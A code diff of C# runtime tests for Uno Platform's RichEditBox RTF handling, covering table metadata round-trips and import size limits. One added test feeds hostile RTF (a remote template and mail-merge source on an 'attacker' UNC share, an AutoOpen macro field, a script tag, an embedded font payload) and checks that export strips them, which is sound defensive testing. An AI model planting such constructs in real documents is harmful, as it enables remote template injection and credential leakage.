@@ -27,7 +27,7 @@ namespace Uno.UI.RuntimeTests.Tests.Windows_UI_Xaml_Controls
 			StringAssert.Contains(exported, @"{\footnote Note}");
 			StringAssert.Contains(exported, @"{\*\bkmkstart mark}");
 			StringAssert.Contains(exported, @"{\*\bkmkend mark}");
-			StringAssert.Contains(exported, @"{\*\vendorx escaped \{brace\}{\*\nested value}\bin3 {\}}");
+			Assert.IsFalse(exported.Contains(@"\vendorx", StringComparison.Ordinal));
 			Assert.IsFalse(exported.Contains(@"\objdata", StringComparison.Ordinal));
 			Assert.IsFalse(exported.Contains(@"\passwordhash", StringComparison.Ordinal));
 		}
@@ -44,6 +44,27 @@ namespace Uno.UI.RuntimeTests.Tests.Windows_UI_Xaml_Controls
 			Assert.IsFalse(exported.Contains(@"\vendorx", StringComparison.Ordinal));
 			Assert.IsFalse(exported.Contains(@"\objdata", StringComparison.Ordinal));
 			Assert.IsFalse(exported.Contains(@"\passwordhash", StringComparison.Ordinal));
+		}
+
+		[TestMethod]
+		public void When_Active_External_Destinations_Are_Not_Preserved()
+		{
+			const string rtf = @"{\rtf1"
+				+ @"{\*\template \\attacker\share\evil.dotm}"
+				+ @"{\*\formfield{\*\ffentrymcr AutoOpen}}"
+				+ @"{\*\mailmerge \\attacker\share\data}"
+				+ @"{\*\htmltag <script>alert(1)</script>}"
+				+ @"{\*\fontemb payload}body}";
+			var document = new RichEditBox().Document;
+
+			document.SetText(TextSetOptions.FormatRtf, rtf);
+			document.GetText(TextGetOptions.FormatRtf, out var exported);
+
+			Assert.IsFalse(exported.Contains(@"\template", StringComparison.Ordinal));
+			Assert.IsFalse(exported.Contains(@"\formfield", StringComparison.Ordinal));
+			Assert.IsFalse(exported.Contains(@"\mailmerge", StringComparison.Ordinal));
+			Assert.IsFalse(exported.Contains(@"\htmltag", StringComparison.Ordinal));
+			Assert.IsFalse(exported.Contains(@"\fontemb", StringComparison.Ordinal));
 		}
 
 		[TestMethod]
@@ -114,7 +135,7 @@ namespace Uno.UI.RuntimeTests.Tests.Windows_UI_Xaml_Controls
 		}
 
 		[TestMethod]
-		public void When_Edit_Is_Inside_Table_Invalidated_Metadata_Is_Dropped()
+		public void When_Edit_Is_Inside_Table_Preserves_Metadata_And_Content()
 		{
 			const string rtf = @"{\rtf1\trowd\cellx1000\intbl AB\cell\row tail}";
 			var document = new RichEditBox().Document;
@@ -123,14 +144,15 @@ namespace Uno.UI.RuntimeTests.Tests.Windows_UI_Xaml_Controls
 			document.GetRange(1, 1).SetText(TextSetOptions.None, "x");
 			document.GetText(TextGetOptions.FormatRtf, out var exported);
 
-			Assert.IsFalse(exported.Contains(@"\trowd", StringComparison.Ordinal));
-			Assert.IsFalse(exported.Contains(@"\cellx", StringComparison.Ordinal));
-			Assert.IsFalse(exported.Contains(@"\intbl", StringComparison.Ordinal));
-			Assert.IsFalse(exported.Contains(@"\row", StringComparison.Ordinal));
+			StringAssert.Contains(exported, @"\trowd");
+			StringAssert.Contains(exported, @"\cellx1000");
+			StringAssert.Contains(exported, @"\intbl");
+			StringAssert.Contains(exported, "AxB");
+			StringAssert.Contains(exported, @"\row");
 		}
 
 		[TestMethod]
-		public void When_Outer_Table_Is_Invalidated_Nested_Table_Metadata_Is_Dropped()
+		public void When_Outer_Table_Is_Edited_Nested_Table_Metadata_Is_Preserved()
 		{
 			const string rtf = @"{\rtf1\trowd\cellx3000\intbl outer "
 				+ @"{\trowd\itap2\cellx1000 nested\cell\nestrow}"
@@ -141,9 +163,9 @@ namespace Uno.UI.RuntimeTests.Tests.Windows_UI_Xaml_Controls
 			document.GetRange(1, 1).SetText(TextSetOptions.None, "x");
 			document.GetText(TextGetOptions.FormatRtf, out var exported);
 
-			Assert.IsFalse(exported.Contains(@"\trowd", StringComparison.Ordinal));
-			Assert.IsFalse(exported.Contains(@"\itap2", StringComparison.Ordinal));
-			Assert.IsFalse(exported.Contains(@"\nestrow", StringComparison.Ordinal));
+			Assert.AreEqual(2, Count(exported, @"\trowd"));
+			StringAssert.Contains(exported, @"\itap2");
+			StringAssert.Contains(exported, @"\nestrow");
 		}
 
 		[TestMethod]
@@ -162,7 +184,44 @@ namespace Uno.UI.RuntimeTests.Tests.Windows_UI_Xaml_Controls
 
 			StringAssert.Contains(undone, @"\trowd");
 			StringAssert.Contains(undone, @"\cellx1000");
-			Assert.IsFalse(redone.Contains(@"\trowd", StringComparison.Ordinal));
+			StringAssert.Contains(redone, @"\trowd");
+			StringAssert.Contains(redone, "AxB");
+		}
+
+		[TestMethod]
+		public void When_Table_Boundary_Is_Deleted_Invalidated_Metadata_Is_Dropped()
+		{
+			const string rtf = @"{\rtf1\trowd\cellx1000\intbl AB\cell\row tail}";
+			var document = new RichEditBox().Document;
+			document.SetText(TextSetOptions.FormatRtf, rtf);
+			document.GetText(TextGetOptions.None, out var text);
+			var cellBoundary = text.IndexOf('\t');
+
+			document.GetRange(cellBoundary, cellBoundary + 1).SetText(TextSetOptions.None, string.Empty);
+			document.GetText(TextGetOptions.FormatRtf, out var exported);
+
+			Assert.IsFalse(exported.Contains(@"\trowd", StringComparison.Ordinal));
+			Assert.IsFalse(exported.Contains(@"\cellx", StringComparison.Ordinal));
+			Assert.IsFalse(exported.Contains(@"\intbl", StringComparison.Ordinal));
+			Assert.IsFalse(exported.Contains(@"\row", StringComparison.Ordinal));
+		}
+
+		[TestMethod]
+		public void When_Text_Is_Inserted_Into_Empty_Table_Cell_RoundTrip_Preserves_It()
+		{
+			const string rtf = @"{\rtf1\trowd\cellx1000\cellx2000\intbl\cell B\cell\row}";
+			var document = new RichEditBox().Document;
+			document.SetText(TextSetOptions.FormatRtf, rtf);
+
+			document.GetRange(0, 0).SetText(TextSetOptions.None, "x");
+			document.GetText(TextGetOptions.FormatRtf, out var exported);
+			var roundTrip = new RichEditBox().Document;
+			roundTrip.SetText(TextSetOptions.FormatRtf, exported);
+			roundTrip.GetText(TextGetOptions.None, out var text);
+
+			StringAssert.StartsWith(text, "x\tB\t\r");
+			StringAssert.Contains(exported, @"\cell");
+			StringAssert.Contains(exported, @"\row");
 		}
 
 		[TestMethod]
@@ -175,14 +234,25 @@ namespace Uno.UI.RuntimeTests.Tests.Windows_UI_Xaml_Controls
 			document.GetRange(0, 0).SetText(TextSetOptions.None, "x");
 			document.GetText(TextGetOptions.FormatRtf, out var exported);
 
-			StringAssert.Contains(exported, @"x\trowd");
+			StringAssert.Contains(exported, @"\trowd");
 			StringAssert.Contains(exported, @"\cellx1000");
+			StringAssert.Contains(exported, "xAB");
 		}
 
 		[TestMethod]
 		public void When_Opaque_Destination_Exceeds_Budget_Import_Is_Rejected()
 		{
 			var rtf = @"{\rtf1{\*\vendorx " + new string('x', 256 * 1024 + 1) + "}}";
+			var document = new RichEditBox().Document;
+
+			Assert.ThrowsExactly<ArgumentException>(() => document.SetText(TextSetOptions.FormatRtf, rtf));
+		}
+
+		[TestMethod]
+		public void When_Empty_Objects_Exceed_Text_Object_Budget_Import_Is_Rejected()
+		{
+			var rtf = @"{\rtf1" + string.Concat(
+				System.Linq.Enumerable.Repeat(@"{\object}", 129)) + "}";
 			var document = new RichEditBox().Document;
 
 			Assert.ThrowsExactly<ArgumentException>(() => document.SetText(TextSetOptions.FormatRtf, rtf));
